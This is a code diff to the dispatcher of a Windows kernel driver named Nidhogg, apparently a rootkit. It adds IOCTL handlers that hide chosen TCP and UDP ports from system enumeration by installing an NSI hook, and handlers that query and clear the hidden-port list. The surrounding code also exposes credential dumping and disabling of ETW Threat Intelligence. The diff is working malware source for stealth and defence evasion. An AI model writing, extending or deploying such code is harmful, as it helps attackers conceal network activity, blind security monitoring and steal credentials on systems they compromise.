@@ -39,6 +39,10 @@
 #define IOCTL_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_REMOVE_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_HIDE_UNHIDE_PORT CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_CLEAR_HIDDEN_PORTS CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_QUERY_HIDDEN_PORTS CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 /*
@@ -57,8 +61,6 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	NTSTATUS status = STATUS_SUCCESS;
 	SIZE_T len = 0;
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
-	// IoGetRequestorProcess() --> Then check the PreviousMode of that process to understand if it is UM or KM.
-
 
 	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
 	case IOCTL_PROTECT_UNPROTECT_PROCESS:
@@ -1200,7 +1202,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	{
 		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
 
-		if (!VALID_SIZE(size, sizeof(ULONG)) && !VALID_SIZE(size, sizeof(DesKeyInformation)) && !VALID_SIZE(size, sizeof(OutputCredentials))) {
+		if (!VALID_SIZE(size, sizeof(ULONG)) && !VALID_SIZE(size, sizeof(DesKeyInformation)) &&
+			!VALID_SIZE(size, sizeof(OutputCredentials))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -1230,6 +1233,101 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			Print(DRIVER_PREFIX "Failed to dump credentials (0x%08X)\n", status);
 
 		len += size;
+		break;
+	}
+
+	case IOCTL_HIDE_UNHIDE_PORT:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (!VALID_SIZE(size, sizeof(InputHiddenPort))) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		HiddenPort hiddenPort{};
+		auto data = (InputHiddenPort*)Irp->AssociatedIrp.SystemBuffer;
+
+		hiddenPort.Type = data->Type;
+		hiddenPort.Remote = data->Remote;
+		hiddenPort.Port = data->Port;
+
+		if (hiddenPort.Port == 0 || (hiddenPort.Type != PortType::TCP && hiddenPort.Type != PortType::UDP)) {
+			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		if (data->Hide) {
+			if (NidhoggNetworkUtils->GetPortsCount() == MAX_PORTS) {
+				Print(DRIVER_PREFIX "List is full.\n");
+				status = STATUS_TOO_MANY_CONTEXT_IDS;
+				break;
+			}
+
+			if (!NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
+				if (!NidhoggNetworkUtils->AddHiddenPort(hiddenPort)) {
+					Print(DRIVER_PREFIX "Failed to add port.\n");
+					status = STATUS_UNSUCCESSFUL;
+					break;
+				}
+
+				if (!NidhoggNetworkUtils->IsCallbackActivated()) {
+					status = NidhoggNetworkUtils->InstallNsiHook();
+
+					if (!NT_SUCCESS(status)) {
+						NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort);
+						Print(DRIVER_PREFIX "Failed to hook nsi.\n");
+						break;
+					}
+				}
+
+				auto prevIrql = KeGetCurrentIrql();
+				KeLowerIrql(PASSIVE_LEVEL);
+				Print(DRIVER_PREFIX "Hid port %d.\n", hiddenPort.Port);
+				KeRaiseIrql(prevIrql, &prevIrql);
+			}
+		}
+		else {
+			if (!NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort)) {
+				status = STATUS_NOT_FOUND;
+				break;
+			}
+
+			if (NidhoggNetworkUtils->GetPortsCount() == 0) {
+				status = NidhoggNetworkUtils->UninstallNsiHook();
+
+				if (!NT_SUCCESS(status))
+					Print(DRIVER_PREFIX "Failed to restore the hook.\n");
+			}
+
+			auto prevIrql = KeGetCurrentIrql();
+			KeLowerIrql(PASSIVE_LEVEL);
+			Print(DRIVER_PREFIX "Unhide port %d.\n", hiddenPort.Port);
+			KeRaiseIrql(prevIrql, &prevIrql);
+		}
+
+		len += size;
+		break;
+	}
+	case IOCTL_QUERY_HIDDEN_PORTS:
+	{
+		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
+
+		if (!VALID_SIZE(size, sizeof(OutputHiddenPorts))) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (OutputHiddenPorts*)Irp->AssociatedIrp.SystemBuffer;
+		NidhoggNetworkUtils->QueryHiddenPorts(data);
+
+		len += size;
+		break;
+	}
+	case IOCTL_CLEAR_HIDDEN_PORTS:
+	{
+		NidhoggNetworkUtils->ClearHiddenPortsList();
 		break;
 	}
 
